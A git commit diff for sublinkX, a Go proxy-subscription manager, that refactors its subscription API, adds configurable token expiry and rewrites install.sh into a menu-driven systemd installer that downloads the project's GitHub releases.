 create mode 100644 static/js/index.C4hOZ5W6.js
 rename static/js/{index.CM09xEA_.js => index.COwZ25X4.js} (78%)
 create mode 100644 static/js/index.CULjW3Hk.js
 create mode 100644 static/js/index.CnrCGsB5.js
 create mode 100644 static/js/index.D5Q7nPxR.js
 delete mode 100644 static/js/index.D6nSmJHY.js
 delete mode 100644 static/js/index.D7zGuEZp.js
 delete mode 100644 static/js/index.DNYq9Wso.js
 create mode 100644 static/js/index.DQt7LRo_.js
 create mode 100644 static/js/index.DpZd_Lnx.js
 delete mode 100644 static/js/internal-doc.B6eN2GGk.js
 create mode 100644 static/js/internal-doc.BtqR0xRB.js
 rename static/js/{isEqual.DDyRMzJ4.js => isEqual.CRCpD0bX.js} (82%)
 delete mode 100644 static/js/isUndefined.DgmxjSXK.js
 delete mode 100644 static/js/knife4j.C3XegEf8.js
 create mode 100644 static/js/knife4j.DpzuQMf0.js
 delete mode 100644 static/js/level1.DbJgCAxV.js
 create mode 100644 static/js/level1.oGeow6KW.js
 delete mode 100644 static/js/level2.CXm5yCsd.js
 create mode 100644 static/js/level2.VmkE7n-X.js
 create mode 100644 static/js/level3-1.BUUzsNUz.js
 delete mode 100644 static/js/level3-1.veb2CjDd.js
 create mode 100644 static/js/level3-2.DzCkFumo.js
 delete mode 100644 static/js/level3-2.ehpMX2NG.js
 delete mode 100644 static/js/node.B7CBv-vw.js
 create mode 100644 static/js/node.Dac5foo2.js
 delete mode 100644 static/js/nodes.BvTKFj9V.js
 create mode 100644 static/js/nodes.DWWjcAer.js
 rename static/js/{position.CopxYfyp.js => position.DlWUUiGS.js} (88%)
 delete mode 100644 static/js/refs.CNClepWF.js
 create mode 100644 static/js/refs.DfdxW6x2.js
 delete mode 100644 static/js/set.DCph2DiX.js
 create mode 100644 static/js/set.D_ZTs_bD.js
 delete mode 100644 static/js/signature.5Hv-l5jE.js
 create mode 100644 static/js/signature.BnAs3F8Q.js
 rename static/js/{strings.CQ_np2th.js => strings.CUsguf90.js} (56%)
 delete mode 100644 static/js/subs.1dXoageE.js
 create mode 100644 static/js/subs.CUOV2WbQ.js
 rename static/js/{swagger.BGskywol.js => swagger.CSJ9B_PJ.js} (50%)
 rename static/js/{temp.gJIG3-Be.js => temp.DAKXAXN0.js} (87%)
 create mode 100644 static/js/template.C1Fhr0SI.js
 delete mode 100644 static/js/template.iDasYWHy.js
 delete mode 100644 static/js/upload.DkIgLQ_p.js
 create mode 100644 static/js/upload.Dn3W5VcS.js
 delete mode 100644 static/js/use-dialog.CybRpRek.js
 create mode 100644 static/js/use-dialog.DYJdXddk.js
 create mode 100644 static/js/wang-editor.Cmb5yULV.js
 delete mode 100644 static/js/wang-editor.CovtB-Ke.js
 create mode 100644 static/js/websocket.C8KDU47E.js
 delete mode 100644 static/js/websocket.YJwVKVlt.js
 create mode 100644 sublink_win64.exe
 create mode 100644 utils/rand.go

diff --git a/.github/workflows/docker-image.yml b/.github/workflows/docker-image.yml
deleted file mode 100644
index 053e31e..0000000
--- a/.github/workflows/docker-image.yml
+++ /dev/null
@@ -1,40 +0,0 @@
-name: Build and Push Multi-Arch Docker Image
-
-on:
-  push:
-    branches:
-      - main
-  pull_request:
-    branches:
-      - main
-
-jobs:
-  build:
-    runs-on: ubuntu-latest
-
-    steps:
-      # 检出代码
-      - name: Checkout code
-        uses: actions/checkout@v2
-
-      # 设置 QEMU 以支持跨架构构建
-      - name: Set up QEMU
-        uses: docker/setup-qemu-action@v2
-
-      # 设置 Docker Buildx
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v2
-
-      # 登录到 Docker Hub
-      - name: Log in to Docker Hub
-        uses: docker/login-action@v2
-        with:
-          username: ${{ secrets.DOCKER_USERNAME }}
-          password: ${{ secrets.DOCKER_PASSWORD }}
-
-      # 构建并推送多平台 Docker 镜像
-      - name: Build and Push Multi-Arch Docker Image
-        run: |
-          docker buildx build --platform linux/amd64,linux/arm64 \
-            -t jaaksi/sublinkx:latest \
-            --push .
diff --git a/.gitignore b/.gitignore
index 4ecfa82..3390dd7 100644
--- a/.gitignore
+++ b/.gitignore
@@ -4,4 +4,5 @@ db
 logs
 sublink_amd64 
 sublink_arm64
-sublink.exe
\ No newline at end of file
+sublink.exe
+install.sh
\ No newline at end of file
diff --git a/README.en-US.md b/README.en-US.md
index f827060..6a7ded9 100644
--- a/README.en-US.md
+++ b/README.en-US.md
@@ -45,9 +45,16 @@ surge support protocol:ss trojan vmess hy2 tuic
 
 ## [Updated Description]
 
-Add specified client
+####Backend Update
 
-Fix menu update function not updating menu version
+1. Enhanced authentication keys are random characters
+2. Added db/config.yaml configuration file 
+   Support custom keys (default random) Key expiration time (default 14 days) Port (default 8000)
+
+####Front-end update
+
+1. Fixed user reset password truncated issue
+2. Add subscription nodes at the front end Support drag sorting
 
 ## [Installation instructions]
 ### linux method:
diff --git a/README.md b/README.md
index 2065442..51948f6 100644
--- a/README.md
+++ b/README.md
@@ -46,9 +46,19 @@ surge支持协议:ss trojan vmess hy2 tuic
 
 ## [更新说明]
 
-新增指定客户端
+#### 后端更新
+
+1. 增强身份验证密钥为随机字符
+2. 新增db/config.yaml配置文件 
+   支持自定义密钥(默认随机) 密钥过期时间(默认14天) 端口(默认8000)
+
+#### 前端更新
+
+1. 修复用户重设密码被截断问题
+2. 前端添加订阅节点支持拖拽排序
+
+
 
-修复菜单更新功能没更新菜单版本
 
 ## [安装说明]
 ### linux方式：
diff --git a/api/auth.go b/api/auth.go
index 3395023..2b773d5 100644
--- a/api/auth.go
+++ b/api/auth.go
@@ -13,12 +13,14 @@ import (
 
 // 获取token
 func GetToken(username string) (string, error) {
+	// 过期时间天
+	ExpireDays := models.ReadConfig().ExpireDays
 	c := &middlewares.JwtClaims{
 		Username: username,
 		StandardClaims: jwt.StandardClaims{
-			ExpiresAt: time.Now().Add(time.Hour * 24 * 14).Unix(), // 设置14天过期
-			IssuedAt:  time.Now().Unix(),                          // 签发时间
-			Subject:   username,                                   // 用户
+			ExpiresAt: time.Now().Add(time.Hour * 24 * time.Duration(ExpireDays)).Unix(), // 设置过期时间
+			IssuedAt:  time.Now().Unix(),                                                 // 签发时间
+			Subject:   username,                                                          // 用户
 		},
 	}
 	token := jwt.NewWithClaims(jwt.SigningMethodHS256, c)
@@ -72,7 +74,7 @@ func UserLogin(c *gin.Context) {
 	// 生成token
 	token, err := GetToken(username)
 	if err != nil {
-		log.Println("获取token失败")
+		log.Println("获取token失败", err)
 		c.JSON(400, gin.H{
 			"msg": "获取token失败",
 		})
diff --git a/api/clients.go b/api/clients.go
index e7b9fc8..62cc8c0 100644
--- a/api/clients.go
+++ b/api/clients.go
@@ -110,7 +110,7 @@ func GetV2ray(c *gin.Context) {
 		c.Writer.WriteString("找不到这个订阅:" + SunName)
 		return
 	}
-	err = sub.GetSub()
+	err = sub.Find()
 	if err != nil {
 		c.Writer.WriteString("读取错误")
 		return
@@ -156,7 +156,7 @@ func GetClash(c *gin.Context) {
 		c.Writer.WriteString("找不到这个订阅:" + SunName)
 		return
 	}
-	err = sub.GetSub()
+	err = sub.Find()
 	if err != nil {
 		c.Writer.WriteString("读取错误")
 		return
@@ -215,7 +215,7 @@ func GetSurge(c *gin.Context) {
 		c.Writer.WriteString("找不到这个订阅:" + SunName)
 		return
 	}
-	err = sub.GetSub()
+	err = sub.Find()
 	if err != nil {
 		c.Writer.WriteString("读取错误")
 		return
diff --git a/api/node.go b/api/node.go
index b5bdc36..3403fda 100644
--- a/api/node.go
+++ b/api/node.go
@@ -14,11 +14,11 @@ import (
 
 func NodeUpdadte(c *gin.Context) {
 	var node models.Node
-	name := c.PostForm("name")
+	NewName := c.PostForm("name")
 	oldname := c.PostForm("oldname")
 	oldlink := c.PostForm("oldlink")
 	link := c.PostForm("link")
-	if name == "" || link == "" {
+	if NewName == "" || link == "" {
 		c.JSON(400, gin.H{
 			"msg": "节点名称 or 备注不能为空",
 		})
@@ -34,7 +34,7 @@ func NodeUpdadte(c *gin.Context) {
 		})
 		return
 	}
-	node.Name = name
+	node.Name = NewName
 	node.Link = link
 	err = node.Update()
 	if err != nil {
diff --git a/api/sub.go b/api/sub.go
index 27b9353..7b8c1fc 100644
--- a/api/sub.go
+++ b/api/sub.go
@@ -1,9 +1,13 @@
+// api/subcription.go
+
 package api
 
 import (
+	// 导入 json 包，用于解析 config 字符串
+	"log"
 	"strconv"
 	"strings"
-	"sublink/models"
+	"sublink/models" // 导入 models 包
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -43,112 +47,126 @@ func SubGet(c *gin.Context) {
 	})
 }
 
-// 添加节点
+// 添加订阅
 func SubAdd(c *gin.Context) {
 	var sub models.Subcription
 	name := c.PostForm("name")
-	config := c.PostForm("config")
-	nodes := c.PostForm("nodes")
-	if name == "" || nodes == "" {
+	configString := c.PostForm("config") // 这里的 configString 是前端传来的 JSON 字符串
+	nodesString := c.PostForm("nodes")
+
+	if name == "" || nodesString == "" {
 		c.JSON(400, gin.H{
-			"msg": "订阅名称 or 节点不能为空",
+			"msg": "订阅名称或节点不能为空",
 		})
 		return
 	}
-	sub.Nodes = []models.Node{}
-	for _, v := range strings.Split(nodes, ",") {
+
+	// 1. 根据 nodesString 字符串，构建 models.Node 数组
+	var selectedNodes []models.Node
+	for _, nodeName := range strings.Split(nodesString, ",") {
+		trimmedName := strings.TrimSpace(nodeName)
+		if trimmedName == "" {
+			continue
+		}
 		var node models.Node
-		node.Name = v
+		node.Name = trimmedName
 		err := node.Find()
 		if err != nil {
+			log.Printf("Warning: Node with name '%s' not found for subscription '%s'. Skipping.", trimmedName, name)
 			continue
 		}
-		sub.Nodes = append(sub.Nodes, node)
+		selectedNodes = append(selectedNodes, node)
 	}
+	sub.Nodes = selectedNodes
+
+	// 2. 将前端传来的原始排序字符串赋值给 NodeOrder 字段
+	sub.NodeOrder = nodesString
+
+	// 3. 将前端传来的 config JSON 字符串直接赋值给 sub.Config
+	sub.Config = configString // <--- 这里直接赋值字符串
 
-	sub.Config = config
 	sub.Name = name
-	sub.CreateDate = time.Now().Format("2006-01-02 15:04:05")
+	sub.CreateDate = time.Now()
 
 	err := sub.Add()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "添加失败",
-		})
-		return
-	}
-	err = sub.AddNode() //创建多对多关系
-	if err != nil {
-		c.JSON(400, gin.H{
-			"msg": err.Error(),
+			"msg": "添加订阅失败: " + err.Error(),
 		})
 		return
 	}
+
 	c.JSON(200, gin.H{
 		"code": "00000",
-		"msg":  "添加成功",
+		"msg":  "添加订阅成功",
 	})
 }
 
-// 更新节点
+// 更新订阅
 func SubUpdate(c *gin.Context) {
 	var sub models.Subcription
 	name := c.PostForm("name")
 	oldname := c.PostForm("oldname")
-	config := c.PostForm("config")
-	nodes := c.PostForm("nodes")
-	if name == "" || nodes == "" {
+	configString := c.PostForm("config") // 这里的 configString 是前端传来的 JSON 字符串
+	nodesString := c.PostForm("nodes")
+
+	if name == "" || nodesString == "" {
 		c.JSON(400, gin.H{
-			"msg": "订阅名称 or 节点不能为空",
+			"msg": "订阅名称或节点不能为空",
 		})
 		return
 	}
-	// 查找旧节点
+
+	// 1. 查找要更新的旧订阅
 	sub.Name = oldname
 	err := sub.Find()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": err.Error(),
+			"msg": "查找旧订阅失败: " + err.Error(),
 		})
 		return
 	}
-	// 更新节点
-	sub.Config = config
-	sub.Name = name
-	sub.CreateDate = time.Now().Format("2006-01-02 15:04:05")
-	sub.Nodes = []models.Node{}
-	for _, v := range strings.Split(nodes, ",") {
+
+	// 2. 根据 nodesString 字符串，构建新的 models.Node 数组
+	var newSelectedNodes []models.Node
+	for _, nodeName := range strings.Split(nodesString, ",") {
+		trimmedName := strings.TrimSpace(nodeName)
+		if trimmedName == "" {
+			continue
+		}
 		var node models.Node
-		node.Name = v
+		node.Name = trimmedName
 		err := node.Find()
 		if err != nil {
+			log.Printf("Warning: Node with name '%s' not found for subscription '%s'. Skipping.", trimmedName, name)
 			continue
 		}
-		sub.Nodes = append(sub.Nodes, node)
+		newSelectedNodes = append(newSelectedNodes, node)
 	}
 
+	// 3. 更新 Subcription 字段
+	sub.Config = configString // <--- 这里直接赋值字符串
+	sub.Name = name
+	sub.CreateDate = time.Now()
+	sub.Nodes = newSelectedNodes
+	sub.NodeOrder = nodesString
+
+	// 4. 调用 sub.Update() 方法
 	err = sub.Update()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "更新失败",
+			"msg": "更新订阅失败: " + err.Error(),
 		})
 		return
 	}
 
-	err = sub.UpdateNodes() //更新多对多关系
-	if err != nil {
-		c.JSON(400, gin.H{
-			"msg": err.Error(),
-		})
-		return
-	}
 	c.JSON(200, gin.H{
 		"code": "00000",
-		"msg":  "更新成功",
+		"msg":  "更新订阅成功",
 	})
 }
 
-// 删除节点
+// 删除订阅 (无需修改)
 func SubDel(c *gin.Context) {
 	var sub models.Subcription
 	id := c.Query("id")
@@ -158,24 +176,30 @@ func SubDel(c *gin.Context) {
 		})
 		return
 	}
-	x, _ := strconv.Atoi(id)
+	x, err := strconv.Atoi(id) // 增加错误检查
+	if err != nil {
+		c.JSON(400, gin.H{
+			"msg": "无效的 ID: " + err.Error(),
+		})
+		return
+	}
 	sub.ID = x
-	err := sub.Find()
+	err = sub.Find()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "查找失败",
+			"msg": "查找订阅失败: " + err.Error(),
 		})
 		return
 	}
 	err = sub.Del()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "删除失败",
+			"msg": "删除订阅失败: " + err.Error(),
 		})
 		return
 	}
 	c.JSON(200, gin.H{
 		"code": "00000",
-		"msg":  "删除成功",
+		"msg":  "删除订阅成功",
 	})
 }
diff --git a/api/user.go b/api/user.go
index 0991c94..e4cf278 100644
--- a/api/user.go
+++ b/api/user.go
@@ -96,8 +96,8 @@ func UserPages(c *gin.Context) {
 // 更新用户信息
 
 func UserSet(c *gin.Context) {
-	NewUsername := c.Param("username")
-	NewPassword := c.Param("password")
+	NewUsername := c.PostForm("username")
+	NewPassword := c.PostForm("password")
 	log.Println(NewUsername, NewPassword)
 	if NewUsername == "" || NewPassword == "" {
 		c.JSON(400, gin.H{
diff --git a/build.sh b/build.sh
index 88934af..fe4a8b8 100755
--- a/build.sh
+++ b/build.sh
@@ -1,2 +1,3 @@
 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -o sublink_amd64 main.go
-GOOS=linux GOARCH=arm64 go build -ldflags="-w -s" -o sublink_arm64 main.go
\ No newline at end of file
+GOOS=linux GOARCH=arm64 go build -ldflags="-w -s" -o sublink_arm64 main.go
+GOOS=windows  GOARCH=amd64  go build -ldflags="-w -s" -o sublink_win64.exe main.go
\ No newline at end of file
diff --git a/demo.sh b/demo.sh
deleted file mode 100644
index 985ccbb..0000000
--- a/demo.sh
+++ /dev/null
@@ -1,4 +0,0 @@
-cd G:\sublinkX\sublinkX
-red=$(go run main.go --version)
-echo "版本号:$red"
-read -p "回车"
\ No newline at end of file
diff --git a/install.sh b/install.sh
index dc51e27..4cc0957 100644
--- a/install.sh
+++ b/install.sh
@@ -1,64 +1,428 @@
 #!/bin/bash
-# 检查用户是否为root
-if [ "$(id -u)" != "0" ]; then
-    echo -e "${RED}该脚本必须以root身份运行。${NC}"
-    exit 1
-fi
 
-# 创建一个程序目录
+# 定义颜色
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NC='\033[0m' # No Color
+
 INSTALL_DIR="/usr/local/bin/sublink"
+BINARY_NAME="sublink"
+SERVICE_FILE="/etc/systemd/system/sublink.service"
 
-if [ ! -d "$INSTALL_DIR" ]; then
-    mkdir -p "$INSTALL_DIR"
-fi
+# --- 辅助函数 ---
+
+# 检查用户是否为root
+check_root() {
+    if [ "$(id -u)" != "0" ]; then
+        echo -e "${RED}该脚本必须以root身份运行。${NC}"
+        exit 1
+    fi
+}
+
+# 执行命令并检查错误
+execute_command() {
+    local cmd="$1"
+    shift
+    echo -e "${YELLOW}执行: $cmd $@${NC}"
+    output=$("$cmd" "$@" 2>&1)
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}错误: 命令 '$cmd $@' 执行失败。${NC}"
+        echo -e "${RED}输出: ${output}${NC}"
+        return 1
+    fi
+    echo "$output"
+    return 0
+}
 
 # 获取最新的发行版标签
-latest_release=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-echo "最新版本: $latest_release"
-
-# 检测机器类型
-machine_type=$(uname -m)
-
-if [ "$machine_type" = "x86_64" ]; then
-    file_name="sublink_amd64"
-elif [ "$machine_type" = "aarch64" ]; then
-    file_name="sublink_arm64"
-else
-    echo "不支持的机器类型: $machine_type"
-    exit 1
-fi
+get_latest_release() {
+    curl_output=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest")
+    if [ $? -ne 0 ]; then
+        echo ""
+        return 1
+    fi
+    tag_name=$(echo "$curl_output" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
+    echo "$tag_name"
+    return 0
+}
+
+# 获取当前运行的二进制文件版本
+get_current_binary_version() {
+    if [ -f "$INSTALL_DIR/$BINARY_NAME" ]; then
+        version_output=$(execute_command "$INSTALL_DIR/$BINARY_NAME" "--version")
+        if [ $? -eq 0 ]; then
+            echo "$version_output"
+        else
+            echo "未知"
+        fi
+    else
+        echo "未安装"
+    fi
+}
+
+# 根据机器类型获取二进制文件名
+get_binary_file_name() {
+    machine_type=$(uname -m)
+    if [ "$machine_type" = "x86_64" ]; then
+        echo "sublink_amd64"
+    elif [ "$machine_type" = "aarch64" ]; then
+        echo "sublink_arm64"
+    else
+        echo ""
+        return 1
+    fi
+    return 0
+}
+
+# --- 菜单功能函数 ---
+
+# 启动服务
+start_service() {
+    echo -e "${GREEN}正在启动服务...${NC}"
+    execute_command systemctl start sublink
+    execute_command systemctl daemon-reload
+    echo -e "${GREEN}服务已启动。${NC}"
+}
+
+# 停止服务
+stop_service() {
+    echo -e "${YELLOW}正在停止服务...${NC}"
+    execute_command systemctl stop sublink
+    execute_command systemctl daemon-reload
+    echo -e "${YELLOW}服务已停止。${NC}"
+}
+
+# 查看服务状态
+view_status() {
+    echo -e "${YELLOW}正在查看服务状态...${NC}"
+    execute_command systemctl status sublink
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 查看运行目录
+view_run_dir() {
+    echo -e "${GREEN}运行目录: ${INSTALL_DIR}${NC}"
+    echo -e "${YELLOW}需要备份的目录为db,template目录为模版文件可备份可不备份。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 修改端口
+modify_port() {
+    read -p "$(echo -e "${YELLOW}请输入新的端口号: ${NC}")" new_port
+
+    if ! [[ "$new_port" =~ ^[0-9]+$ ]]; then
+        echo -e "${RED}无效的端口号，请输入数字。${NC}"
+        return
+    fi
+
+    echo -e "${YELLOW}新的端口号: $new_port${NC}"
+
+    if [ ! -f "$SERVICE_FILE" ]; then
+        echo -e "${RED}服务文件不存在: $SERVICE_FILE。请先运行安装程序。${NC}"
+        return
+    fi
+
+    # 替换或添加 ExecStart 行中的 --port 参数
+    # 查找 ExecStart 行，如果已经有 --port 参数，则替换它；否则，添加它
+    if grep -q "ExecStart=.* --port [0-9]\+" "$SERVICE_FILE"; then
+        # 已经存在 --port 参数，替换它
+        execute_command sed -i -E "s/(--port )[0-9]+/\1$new_port/" "$SERVICE_FILE"
+    else
+        # 不存在 --port 参数，在 ExecStart 后添加它
+        execute_command sed -i -E "s|(ExecStart=.+\s?)|\1run --port $new_port |" "$SERVICE_FILE"
+    fi
+
+    echo -e "${YELLOW}重新加载 systemd 守护进程...${NC}"
+    execute_command systemctl daemon-reload
+    echo -e "${YELLOW}重启 Sublink 服务...${NC}"
+    execute_command systemctl restart sublink
+
+    echo -e "${GREEN}端口修改完成，服务已重启。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 更新服务
+update_service() {
+    echo -e "${GREEN}正在检查并更新 Sublink 服务...${NC}"
+
+    latest_release=$(get_latest_release)
+    if [ -z "$latest_release" ]; then
+        echo -e "${RED}无法获取最新版本信息，更新失败。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+    echo -e "${GREEN}最新版本: $latest_release${NC}"
+
+    current_version=$(get_current_binary_version)
+    echo -e "${GREEN}当前版本: $current_version${NC}"
+
+    if [ "$current_version" = "$latest_release" ]; then
+        echo -e "${GREEN}当前已经是最新版本，无需更新。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    file_name=$(get_binary_file_name)
+    if [ -z "$file_name" ]; then
+        echo -e "${RED}不支持的机器类型，更新失败。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    echo -e "${YELLOW}停止 Sublink 服务...${NC}"
+    execute_command systemctl stop sublink || true # 允许停止失败，因为可能未运行
+
+    echo -e "${YELLOW}下载新版本 $latest_release/$file_name...${NC}"
+    temp_file="/tmp/$file_name"
+    execute_command curl -L -o "$temp_file" "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_name"
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}下载失败，请检查网络连接。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    echo -e "${YELLOW}设置文件可执行权限...${NC}"
+    execute_command chmod +x "$temp_file"
+
+    echo -e "${YELLOW}移动文件到 ${INSTALL_DIR}/${BINARY_NAME}...${NC}"
+    execute_command mv "$temp_file" "$INSTALL_DIR/$BINARY_NAME"
 
-# 下载文件
-cd ~
-curl -LO "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_name"
+    echo -e "${YELLOW}重新加载 systemd 守护进程...${NC}"
+    execute_command systemctl daemon-reload
 
-# 设置文件为可执行
-chmod +x $file_name
+    echo -e "${YELLOW}启动并启用 Sublink 服务...${NC}"
+    execute_command systemctl start sublink
+    execute_command systemctl enable sublink
 
-# 移动文件到指定目录
-mv $file_name "$INSTALL_DIR/sublink"
+    echo -e "${GREEN}Sublink 服务更新完成。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
 
-# 创建systemctl服务
-echo "[Unit]
+# 重置账号密码
+reset_account() {
+    read -p "$(echo -e "${YELLOW}请输入新的账号: ${NC}")" new_username
+    read -p "$(echo -e "${YELLOW}请输入新的密码: ${NC}")" new_password
+
+    if [ -z "$new_username" ] || [ -z "$new_password" ]; then
+        echo -e "${RED}账号和密码不能为空。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    echo -e "${YELLOW}正在重置账号密码...${NC}"
+    # 调用 Go 程序的 setting 命令
+    execute_command "$INSTALL_DIR/$BINARY_NAME" setting --username "$new_username" --password "$new_password"
+    
+    echo -e "${YELLOW}重启 Sublink 服务以应用更改...${NC}"
+    execute_command systemctl restart sublink
+
+    echo -e "${GREEN}账号密码重置成功。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 卸载安装
+uninstall_service() {
+    read -p "$(echo -e "${YELLOW}你是否要卸载 Sublink 服务? (y/n): ${NC}")" confirm_uninstall
+    if [ ! "$confirm_uninstall" = "y" ]; then
+        echo -e "${NC}取消卸载。${NC}"
+        return
+    fi
+
+    echo -e "${YELLOW}正在卸载 Sublink 服务...${NC}"
+
+    # 停止服务之前检查服务是否存在
+    if systemctl is-active --quiet sublink; then
+        echo -e "${YELLOW}停止服务...${NC}"
+        execute_command systemctl stop sublink
+    fi
+    if systemctl is-enabled --quiet sublink; then
+        echo -e "${YELLOW}禁用服务...${NC}"
+        execute_command systemctl disable sublink
+    fi
+
+    read -p "$(echo -e "${YELLOW}是否删除 systemd 服务文件 (包含端口设置)? (y/n): ${NC}")" is_del_systemd
+    if [ "$is_del_systemd" = "y" ]; then
+        echo -e "${YELLOW}删除 systemd 服务文件...${NC}"
+        execute_command rm "$SERVICE_FILE"
+        execute_command systemctl daemon-reload # 重新加载以清除服务
+    fi
+
+    echo -e "${YELLOW}删除相关文件和目录...${NC}"
+    execute_command rm -rf "$INSTALL_DIR/$BINARY_NAME" # 删除二进制文件
+    execute_command rm -f "/usr/bin/sublink_installer.sh" # 删除自身脚本
+
+    read -p "$(echo -e "${YELLOW}是否删除模板文件和数据库? (y/n): ${NC}")" is_delete_data
+    if [ "$is_delete_data" = "y" ]; then
+        echo -e "${YELLOW}删除数据目录...${NC}"
+        execute_command rm -rf "$INSTALL_DIR/db"
+        echo -e "${YELLOW}删除模板目录...${NC}"
+        execute_command rm -rf "$INSTALL_DIR/template"
+        echo -e "${YELLOW}删除日志目录...${NC}"
+        execute_command rm -rf "$INSTALL_DIR/logs"
+    fi
+
+    echo -e "${GREEN}卸载完成。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+    exit 0 # 卸载后直接退出
+}
+
+# --- 主菜单逻辑 ---
+
+show_menu() {
+    clear
+    current_version=$(get_current_binary_version)
+    latest_release=$(get_latest_release)
+    if [ -z "$latest_release" ]; then
+        latest_release="无法获取"
+    fi
+
+    # 获取服务状态
+    service_status=$(systemctl is-active sublink 2>/dev/null)
+    if [ "$service_status" = "active" ]; then
+        display_status="${GREEN}已运行${NC}"
+    else
+        display_status="${RED}未运行${NC}"
+    fi
+
+    echo -e "${YELLOW}--- Sublink 管理菜单 ---${NC}"
+    echo -e "最新版本: ${GREEN}${latest_release}${NC}"
+    echo -e "当前版本: ${GREEN}${current_version}${NC}"
+    echo -e "当前运行状态: ${display_status}"
+    echo -e "${GREEN}1. 启动服务${NC}"
+    echo -e "${GREEN}2. 停止服务${NC}"
+    echo -e "${GREEN}3. 卸载安装${NC}"
+    echo -e "${GREEN}4. 查看服务状态${NC}"
+    echo -e "${GREEN}5. 查看运行目录${NC}"
+    echo -e "${GREEN}6. 修改端口${NC}"
+    echo -e "${GREEN}7. 更新${NC}"
+    echo -e "${GREEN}8. 重置账号密码${NC}"
+    echo -e "${GREEN}0. 退出${NC}"
+    echo -n -e "${YELLOW}请选择一个选项: ${NC}"
+}
+
+handle_menu_option() {
+    read option
+
+    case "$option" in
+        1) start_service ;;
+        2) stop_service ;;
+        3) uninstall_service ;;
+        4) view_status ;;
+        5) view_run_dir ;;
+        6) modify_port ;;
+        7) update_service ;;
+        8) reset_account ;;
+        0) echo -e "${GREEN}退出。${NC}"; exit 0 ;;
+        *) echo -e "${RED}无效的选项，请重新选择。${NC}"; sleep 1 ;;
+    esac
+}
+
+# --- 安装逻辑 ---
+
+install_sublink() {
+    check_root
+
+    echo -e "${YELLOW}--- 正在安装 Sublink 服务 ---${NC}"
+
+    latest_release=$(get_latest_release)
+    if [ -z "$latest_release" ]; then
+        echo -e "${RED}无法获取最新版本信息，安装失败。${NC}"
+        exit 1
+    fi
+    echo -e "${GREEN}最新版本: $latest_release${NC}"
+
+    file_to_download=$(get_binary_file_name)
+    if [ -z "$file_to_download" ]; then
+        echo -e "${RED}不支持的机器类型: $(uname -m)。安装失败。${NC}"
+        exit 1
+    fi
+
+    # 创建程序目录
+    if [ ! -d "$INSTALL_DIR" ]; then
+        echo -e "${YELLOW}创建安装目录: $INSTALL_DIR${NC}"
+        execute_command mkdir -p "$INSTALL_DIR"
+    fi
+
+    # 下载文件
+    echo -e "${YELLOW}下载 Sublink $latest_release 版本到 /tmp/$file_to_download...${NC}"
+    temp_download_path="/tmp/$file_to_download"
+    execute_command curl -L -o "$temp_download_path" "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_to_download"
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}下载失败，请检查网络连接。${NC}"
+        exit 1
+    fi
+
+    # 设置文件为可执行
+    echo -e "${YELLOW}设置可执行权限...${NC}"
+    execute_command chmod +x "$temp_download_path"
+
+    # 移动文件到指定目录
+    echo -e "${YELLOW}移动二进制文件到 ${INSTALL_DIR}/${BINARY_NAME}...${NC}"
+    execute_command mv "$temp_download_path" "$INSTALL_DIR/$BINARY_NAME"
+
+    # 创建 systemctl 服务文件
+    echo -e "${YELLOW}创建 systemd 服务文件: $SERVICE_FILE${NC}"
+    cat << EOF | tee "$SERVICE_FILE"
+[Unit]
 Description=Sublink Service
+After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/sublink
+ExecStart=$INSTALL_DIR/$BINARY_NAME run --port 8000
 WorkingDirectory=$INSTALL_DIR
+Restart=always
+User=root
+Group=root
+# AmbientCapabilities=CAP_NET_BIND_SERVICE # 如果ExecStart使用非root用户，可以考虑添加
+
 [Install]
-WantedBy=multi-user.target" | tee /etc/systemd/system/sublink.service
+WantedBy=multi-user.target
+EOF
+
+    # 重新加载systemd守护进程
+    echo -e "${YELLOW}重新加载 systemd 守护进程...${NC}"
+    execute_command systemctl daemon-reload
 
-# 重新加载systemd守护进程
-systemctl daemon-reload
+    # 启动并启用服务
+    echo -e "${YELLOW}启动并启用 Sublink 服务...${NC}"
+    execute_command systemctl start sublink
+    execute_command systemctl enable sublink
 
-# 启动并启用服务
-systemctl start sublink
-systemctl enable sublink
-echo "服务已启动并已设置为开机启动"
-echo "默认账号admin密码123456 默认端口8000"
-echo "安装完成已经启动输入sublink可以呼出菜单"
+    # 将此脚本自身复制到 /usr/bin，以便可以全局调用菜单
+    echo -e "${YELLOW}将脚本自身复制到 /usr/bin/sublink...${NC}"
